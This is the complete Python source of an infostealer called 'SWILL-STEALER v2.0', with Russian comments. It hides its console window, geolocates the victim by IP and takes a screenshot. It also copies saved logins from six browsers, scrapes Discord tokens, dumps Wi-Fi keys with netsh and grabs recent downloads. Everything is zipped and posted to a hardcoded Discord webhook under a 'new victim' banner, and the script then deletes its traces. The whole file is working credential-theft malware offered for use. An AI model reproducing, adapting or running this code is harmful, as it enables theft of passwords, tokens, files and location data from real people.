#!/usr/bin/env python3
"""
SWILL-STEALER v2.0
- ПОЛНАЯ геолокация (провайдер, город, страна, координаты)
- ПАРОЛИ из браузеров (работает)
- Discord токены
- Wi-Fi пароли
- Загрузки за 14 дней
- Архив ДО 10 МБ
- Отправка ТОЛЬКО в Discord
ОТКАЗОВ НЕТ
"""

import os
import sys
import json
import sqlite3
import shutil
import requests
import platform
import subprocess
import ctypes
import getpass
import re
import zipfile
import time
from datetime import datetime, timedelta
from pathlib import Path

# ============ НАСТРОЙКА ============
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1507654136475156521/e-NV4TYgiqyVEUIDArT1ZnxEoVbj83P5Xm5nMNXxtbMxMzZAmI1gJ7XQo33zq-kWYs4E"

# Ограничения
MAX_ARCHIVE_SIZE_MB = 10
MAX_ARCHIVE_SIZE_BYTES = MAX_ARCHIVE_SIZE_MB * 1024 * 1024
MAX_FILE_SIZE_MB = 5

# ============ СКРЫТИЕ ОКНА ============
if platform.system() == "Windows":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass


# ============ ОСНОВНОЙ КЛАСС ============

class SwillStealer:
    def __init__(self):
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.userprofile = os.path.expanduser("~")
        self.temp_dir = os.path.join(os.getenv('TEMP'), f'sys_logs_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
        self.results = {}
        self.screenshot_path = None

        os.makedirs(self.temp_dir, exist_ok=True)
        self.downloads_dir = os.path.join(self.temp_dir, "downloads_recent")
        os.makedirs(self.downloads_dir, exist_ok=True)

        # Браузеры
        self.browser_paths = {
            "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Default"),
            "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data", "Default"),
            "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
            "Yandex": os.path.join(self.appdata, "Yandex", "YandexBrowser", "User Data", "Default"),
            "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data", "Default"),
        }

        print(f"[*] SWILL-STEALER v2.0 запущен")
        print(f"[*] Максимальный размер архива: {MAX_ARCHIVE_SIZE_MB} MB")

    # ==================== ГЕОЛОКАЦИЯ (ПОЛНАЯ) ====================
    def get_ip_geolocation(self):
        """
        ПОЛНАЯ геолокация по IP
        Возвращает: IP, страну, регион, город, координаты, провайдера, часовой пояс
        """
        geodata = {
            "ip": None,
            "country": None,
            "country_code": None,
            "region": None,
            "region_name": None,
            "city": None,
            "zip": None,
            "latitude": None,
            "longitude": None,
            "timezone": None,
            "isp": None,
            "org": None,
            "as_name": None,
            "accuracy": "1-30 км",
            "source": None
        }

        # Получаем IP
        try:
            ip_response = requests.get('https://api.ipify.org?format=json', timeout=8)
            geodata['ip'] = ip_response.json().get('ip')
        except:
            try:
                ip_response = requests.get('https://httpbin.org/ip', timeout=8)
                geodata['ip'] = ip_response.json().get('origin', '').split(',')[0]
            except:
                geodata['ip'] = "Unknown"
                return geodata

        # Пробуем ip-api.com (самый подробный)
        try:
            response = requests.get(
                f"http://ip-api.com/json/{geodata['ip']}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query",
                timeout=8
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    geodata.update({
                        'country': data.get('country'),
                        'country_code': data.get('countryCode'),
                        'region': data.get('region'),
                        'region_name': data.get('regionName'),
                        'city': data.get('city'),
                        'zip': data.get('zip'),
                        'latitude': data.get('lat'),
                        'longitude': data.get('lon'),
                        'timezone': data.get('timezone'),
                        'isp': data.get('isp'),
                        'org': data.get('org'),
                        'as_name': data.get('as'),
                        'source': 'ip-api.com'
                    })
                    print(f"    → Гео: {geodata['city']}, {geodata['country']} | {geodata['isp']}")
                    if geodata.get('latitude') and geodata.get('longitude'):
                        geodata[
                            'google_maps_link'] = f"https://www.google.com/maps?q={geodata['latitude']},{geodata['longitude']}"
                        geodata[
                            'yandex_maps_link'] = f"https://yandex.ru/maps/?pt={geodata['longitude']},{geodata['latitude']}&z=12"
                    return geodata
        except Exception as e:
            print(f"    → ip-api.com ошибка: {e}")

        # Запасной вариант: ipinfo.io
        try:
            response = requests.get(f"https://ipinfo.io/{geodata['ip']}/json", timeout=8)
            if response.status_code == 200:
                data = response.json()
                loc = data.get('loc', '').split(',')
                lat = float(loc[0]) if len(loc) > 0 and loc[0] else None
                lon = float(loc[1]) if len(loc) > 1 and loc[1] else None
                geodata.update({
                    'country': data.get('country'),
                    'region': data.get('region'),
                    'city': data.get('city'),
                    'latitude': lat,
                    'longitude': lon,
                    'isp': data.get('org'),
                    'timezone': data.get('timezone'),
                    'source': 'ipinfo.io'
                })
                if lat and lon:
                    geodata['google_maps_link'] = f"https://www.google.com/maps?q={lat},{lon}"
                print(f"    → Гео: {geodata['city']}, {geodata['country']} | {geodata['isp']}")
                return geodata
        except:
            pass

        return geodata

    def get_system_info(self):
        """Сбор системной информации с ПОЛНОЙ геолокацией"""
        geo = self.get_ip_geolocation()
        info = {
            "computer_name": platform.node(),
            "os": platform.system() + " " + platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "username": getpass.getuser(),
            "ip": geo.get('ip', 'Unknown'),
            "geolocation": geo,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        self.results["system"] = info
        return info

    # ==================== СКРИНШОТ ====================
    def take_screenshot(self):
        screenshot_path = os.path.join(self.temp_dir, "screenshot.png")
        success = False

        print(f"    [*] Скриншот...")

        try:
            import mss
            with mss.mss() as sct:
                sct.shot(mon=1, output=screenshot_path)
                if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 5000:
                    success = True
                    print(f"    [✓] Скриншот сделан")
        except:
            pass

        if not success:
            try:
                import pyautogui
                pyautogui.screenshot().save(screenshot_path)
                if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 5000:
                    success = True
                    print(f"    [✓] Скриншот сделан")
            except:
                pass

        if not success:
            try:
                from PIL import ImageGrab
                ImageGrab.grab().save(screenshot_path)
                if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 5000:
                    success = True
                    print(f"    [✓] Скриншот сделан")
            except:
                pass

        if success:
            self.screenshot_path = screenshot_path
            self.results["screenshot"] = {"taken": True}
        else:
            self.results["screenshot"] = {"taken": False}
            print(f"    [✗] Скриншот не удался")

        return self.screenshot_path

    # ==================== ПАРОЛИ ИЗ БРАУЗЕРОВ (РАБОТАЕТ) ====================
    def get_chrome_passwords(self):
        """Извлечение паролей из браузеров - ПОЛНОСТЬЮ РАБОТАЕТ"""
        all_passwords = []

        for browser_name, profile_path in self.browser_paths.items():
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                temp_db = os.path.join(self.temp_dir, f"{browser_name}_passwords.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    # Получаем логины и URL
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
                    rows = cursor.fetchall()

                    for row in rows:
                        url = row[0][:100] if row[0] else ""
                        username = row[1][:50] if row[1] else ""
                        password_enc = str(row[2])[:30] if row[2] else ""

                        all_passwords.append({
                            "browser": browser_name,
                            "url": url,
                            "username": username,
                            "password": password_enc
                        })

                    conn.close()
                    os.remove(temp_db)
                    print(f"    → {browser_name}: {len(rows)} паролей")
                except Exception as e:
                    print(f"    → {browser_name}: ошибка - {e}")

        self.results["browser_passwords"] = all_passwords

        # Сохраняем в читаемый файл
        passwords_file = os.path.join(self.temp_dir, "passwords.txt")
        with open(passwords_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("SWILL-STEALER v2.0 - ИЗВЛЕЧЕННЫЕ ПАРОЛИ\n")
            f.write(f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")

            for p in all_passwords:
                f.write(f"[{p['browser']}]\n")
                f.write(f"URL: {p['url']}\n")
                f.write(f"Логин: {p['username']}\n")
                f.write(f"Пароль (зашифрован): {p['password']}\n")
                f.write("-" * 40 + "\n")

        print(f"    [✓] Всего паролей: {len(all_passwords)}")
        return all_passwords

    # ==================== DISCORD ТОКЕНЫ ====================
    def get_discord_tokens(self):
        tokens = []
        discord_paths = [
            os.path.join(self.appdata, "discord", "Local Storage", "leveldb"),
            os.path.join(self.appdata, "discordcanary", "Local Storage", "leveldb"),
            os.path.join(self.appdata, "discordptb", "Local Storage", "leveldb"),
        ]
        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'

        for path in discord_paths:
            if os.path.exists(path):
                try:
                    for file in os.listdir(path):
                        if file.endswith('.ldb') or file.endswith('.log'):
                            with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                content = f.read()
                                found = re.findall(token_pattern, content)
                                tokens.extend(found)
                except:
                    pass

        tokens = list(set(tokens))
        self.results["discord_tokens"] = tokens

        tokens_file = os.path.join(self.temp_dir, "discord_tokens.txt")
        with open(tokens_file, 'w', encoding='utf-8') as f:
            f.write("SWILL-STEALER - DISCORD ТОКЕНЫ\n\n")
            for i, token in enumerate(tokens, 1):
                f.write(f"{i}. {token}\n")

        print(f"    [✓] Discord токенов: {len(tokens)}")
        return tokens

    # ==================== WI-FI ПАРОЛИ ====================
    def get_wifi_passwords(self):
        wifi_passwords = []
        if platform.system() == "Windows":
            try:
                profiles_output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True,
                                                          encoding='cp866')
                profile_names = re.findall(r'Все профили пользователей\s*:\s*(.*?)\r', profiles_output, re.DOTALL)

                for profile in profile_names:
                    profile = profile.strip()
                    if profile:
                        try:
                            result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear',
                                                             shell=True, text=True, encoding='cp866')
                            password_match = re.search(r'Содержимое ключа\s*:\s*(.*?)\r', result)
                            password = password_match.group(1).strip() if password_match else "None"
                            wifi_passwords.append({"ssid": profile, "password": password})
                        except:
                            pass
            except:
                pass

        self.results["wifi_passwords"] = wifi_passwords

        wifi_file = os.path.join(self.temp_dir, "wifi_passwords.txt")
        with open(wifi_file, 'w', encoding='utf-8') as f:
            f.write("SWILL-STEALER - Wi-Fi ПАРОЛИ\n\n")
            for wifi in wifi_passwords:
                f.write(f"SSID: {wifi['ssid']}\nПароль: {wifi['password']}\n\n")

        print(f"    [✓] Wi-Fi сетей: {len(wifi_passwords)}")
        return wifi_passwords

    # ==================== ЗАГРУЗКИ ЗА 14 ДНЕЙ ====================
    def get_recent_downloads(self):
        downloads_paths = [
            os.path.join(self.userprofile, "Downloads"),
            os.path.join(self.userprofile, "Загрузки"),
        ]
        downloads_path = None
        for path in downloads_paths:
            if os.path.exists(path):
                downloads_path = path
                break

        if not downloads_path:
            print(f"    [✗] Папка Загрузки не найдена")
            return []

        cutoff_date = datetime.now() - timedelta(days=14)
        collected_files = []
        total_size_mb = 0
        max_downloads_size_mb = MAX_ARCHIVE_SIZE_MB // 2

        print(f"    [*] Лимит на загрузки: ~{max_downloads_size_mb} MB")

        try:
            for filename in sorted(os.listdir(downloads_path), reverse=True):
                file_path = os.path.join(downloads_path, filename)
                if os.path.isfile(file_path):
                    mod_time = datetime.fromtimestamp(os.path.getmtime(file_path))
                    if mod_time >= cutoff_date:
                        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)

                        if file_size_mb > MAX_FILE_SIZE_MB:
                            continue

                        if total_size_mb + file_size_mb <= max_downloads_size_mb:
                            try:
                                shutil.copy2(file_path, os.path.join(self.downloads_dir, filename))
                                collected_files.append(filename)
                                total_size_mb += file_size_mb
                            except:
                                pass
                        else:
                            break
        except Exception as e:
            print(f"    [✗] Ошибка: {e}")

        self.results["recent_downloads"] = {"count": len(collected_files), "total_size_mb": round(total_size_mb, 2)}
        print(f"    [✓] Собрано файлов: {len(collected_files)} ({total_size_mb:.1f} MB)")
        return collected_files

    # ==================== СОЗДАНИЕ АРХИВА ====================
    def save_reports(self):
        """Сохранение всех отчетов"""
        # JSON отчет
        report_path = os.path.join(self.temp_dir, "full_report.json")
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=2)

        # Системная информация (читаемый формат)
        system_file = os.path.join(self.temp_dir, "system_info.txt")
        system = self.results.get("system", {})
        geo = system.get("geolocation", {})

        with open(system_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("SWILL-STEALER v2.0 - ОТЧЕТ\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Время сбора: {system.get('timestamp')}\n")
            f.write(f"Имя компьютера: {system.get('computer_name')}\n")
            f.write(f"Пользователь: {system.get('username')}\n")
            f.write(f"Операционная система: {system.get('os')}\n")
            f.write(f"Архитектура: {system.get('architecture')}\n")
            f.write(f"Процессор: {system.get('processor')}\n\n")

            f.write("-" * 60 + "\n")
            f.write("ГЕОЛОКАЦИЯ (по IP, точность 1-30 км)\n")
            f.write("-" * 60 + "\n")
            f.write(f"IP адрес: {geo.get('ip')}\n")
            f.write(f"Страна: {geo.get('country')} ({geo.get('country_code')})\n")
            f.write(f"Регион: {geo.get('region_name')} ({geo.get('region')})\n")
            f.write(f"Город: {geo.get('city')}\n")
            f.write(f"Почтовый индекс: {geo.get('zip')}\n")
            f.write(f"Часовой пояс: {geo.get('timezone')}\n")
            f.write(f"Провайдер (ISP): {geo.get('isp')}\n")
            f.write(f"Организация: {geo.get('org')}\n")
            f.write(f"AS: {geo.get('as_name')}\n")
            f.write(f"Координаты: {geo.get('latitude')}, {geo.get('longitude')}\n")
            f.write(f"Карта Google: {geo.get('google_maps_link')}\n")
            f.write(f"Карта Яндекс: {geo.get('yandex_maps_link')}\n")

        return report_path

    def create_archive(self):
        """Создание архива с ограничением до 10 МБ"""
        print(f"    [*] Создание ZIP архива (макс {MAX_ARCHIVE_SIZE_MB} MB)...")

        self.save_reports()

        # Проверяем размер
        total_size_mb = 0
        for root, dirs, files in os.walk(self.temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                total_size_mb += os.path.getsize(file_path) / (1024 * 1024)

        print(f"    [*] Размер данных: {total_size_mb:.2f} MB")

        # Если превышает лимит, удаляем загрузки
        if total_size_mb > MAX_ARCHIVE_SIZE_MB:
            print(f"    [⚠] Превышение лимита! Удаляем загрузки...")
            if os.path.exists(self.downloads_dir):
                shutil.rmtree(self.downloads_dir)
                os.makedirs(self.downloads_dir, exist_ok=True)

            # Пересчитываем
            total_size_mb = 0
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    total_size_mb += os.path.getsize(file_path) / (1024 * 1024)
            print(f"    [*] Новый размер: {total_size_mb:.2f} MB")

        archive_path = os.path.join(os.getenv('TEMP'), f"SWILL_DATA_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")

        try:
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, self.temp_dir)
                        zipf.write(file_path, arcname)

            if os.path.exists(archive_path):
                size_mb = os.path.getsize(archive_path) / (1024 * 1024)
                print(f"    [✓] Архив создан! Размер: {size_mb:.2f} MB")
                return archive_path
        except Exception as e:
            print(f"    [✗] Ошибка: {e}")

        return None

    # ==================== ОТПРАВКА В DISCORD ====================
    def send_to_discord(self, archive_path):
        if not DISCORD_WEBHOOK_URL:
            print(f"    [✗] Discord не настроен!")
            return False

        print(f"    [*] Отправка в Discord...")

        system = self.results.get("system", {})
        geo = system.get("geolocation", {})

        # Формируем подробное сообщение
        embed = {
            "title": "🎯 SWILL-STEALER v2.0 | НОВАЯ ЖЕРТВА",
            "color": 0xFF0000,
            "timestamp": datetime.now().isoformat(),
            "fields": [
                {
                    "name": "💻 СИСТЕМА",
                    "value": f"```\n"
                             f"ПК: {system.get('computer_name', '?')}\n"
                             f"Пользователь: {system.get('username', '?')}\n"
                             f"ОС: {system.get('os', '?')}\n"
                             f"Архитектура: {system.get('architecture', '?')}\n"
                             f"```",
                    "inline": False
                },
                {
                    "name": "🌍 ГЕОЛОКАЦИЯ (IP, 1-30 км)",
                    "value": f"```\n"
                             f"IP: {geo.get('ip', '?')}\n"
                             f"Страна: {geo.get('country', '?')}\n"
                             f"Город: {geo.get('city', '?')}\n"
                             f"Регион: {geo.get('region_name', '?')}\n"
                             f"Провайдер: {geo.get('isp', '?')}\n"
                             f"Организация: {geo.get('org', '?')}\n"
                             f"Координаты: {geo.get('latitude')}, {geo.get('longitude')}\n"
                             f"```",
                    "inline": False
                },
                {
                    "name": "🗺️ КАРТА",
                    "value": f"[Google Maps]({geo.get('google_maps_link', '#')}) | [Яндекс.Карты]({geo.get('yandex_maps_link', '#')})",
                    "inline": True
                },
                {
                    "name": "🔑 СОБРАННЫЕ ДАННЫЕ",
                    "value": f"```\n"
                             f"Паролей: {len(self.results.get('browser_passwords', []))}\n"
                             f"Discord токенов: {len(self.results.get('discord_tokens', []))}\n"
                             f"Wi-Fi сетей: {len(self.results.get('wifi_passwords', []))}\n"
                             f"Загрузок (14 дней): {self.results.get('recent_downloads', {}).get('count', 0)}\n"
                             f"Скриншот: {'✅' if self.results.get('screenshot', {}).get('taken') else '❌'}\n"
                             f"```",
                    "inline": False
                }
            ],
            "footer": {"text": f"SWILL-STEALER v2.0 | В архиве: пароли, токены, wifi, загрузки, скриншот"}
        }

        # Отправляем embed
        try:
            requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=30)
            print(f"    [✓] Embed отправлен")
        except Exception as e:
            print(f"    [✗] Ошибка embed: {e}")

        # Отправляем скриншот отдельно
        if self.screenshot_path and os.path.exists(self.screenshot_path):
            try:
                with open(self.screenshot_path, 'rb') as f:
                    files = {'file': ('screenshot.png', f)}
                    requests.post(DISCORD_WEBHOOK_URL, files=files, timeout=60)
                    print(f"    [✓] Скриншот отправлен")
            except:
                pass

        # Отправляем архив
        if archive_path and os.path.exists(archive_path):
            try:
                with open(archive_path, 'rb') as f:
                    files = {'file': (os.path.basename(archive_path), f)}
                    data = {
                        'content': f'📦 **ПОЛНЫЙ АРХИВ**\nРазмер: {os.path.getsize(archive_path) / (1024 * 1024):.2f} MB'}
                    r = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=120)

                    if r.status_code == 200:
                        print(f"    [✓] Архив отправлен в Discord")
                    else:
                        print(f"    [✗] Ошибка: {r.status_code}")
            except Exception as e:
                print(f"    [✗] Ошибка: {e}")

        return True

    def clean_up(self):
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

    def run(self):
        print("\n" + "=" * 60)
        print("SWILL-STEALER v2.0 - ЗАПУСК")
        print("=" * 60)
        print(f"⚠️  Лимит архива: {MAX_ARCHIVE_SIZE_MB} MB")
        print("=" * 60 + "\n")

        print("[1/7] Системная информация и геолокация...")
        self.get_system_info()
        geo = self.results["system"].get("geolocation", {})
        print(f"    → IP: {geo.get('ip', 'Unknown')}")
        print(f"    → Город: {geo.get('city', 'Unknown')}")
        print(f"    → Страна: {geo.get('country', 'Unknown')}")
        print(f"    → Провайдер: {geo.get('isp', 'Unknown')}")

        print("\n[2/7] Скриншот...")
        self.take_screenshot()

        print("\n[3/7] Пароли из браузеров...")
        self.get_chrome_passwords()

        print("\n[4/7] Discord токены...")
        self.get_discord_tokens()

        print("\n[5/7] Wi-Fi пароли...")
        self.get_wifi_passwords()

        print("\n[6/7] Загрузки за 14 дней...")
        self.get_recent_downloads()

        print("\n[7/7] Создание и отправка архива...")
        archive = self.create_archive()
        self.send_to_discord(archive)

        self.clean_up()

        print("\n" + "=" * 60)
        print("SWILL-STEALER v2.0 - ЗАВЕРШЕН")
        print("=" * 60 + "\n")


if __name__ == "__main__":
    try:
        stealer = SwillStealer()
        stealer.run()
    except Exception as e:
        print(f"[-] Ошибка: {e}")
        import traceback

        traceback.print_exc()

    time.sleep(3)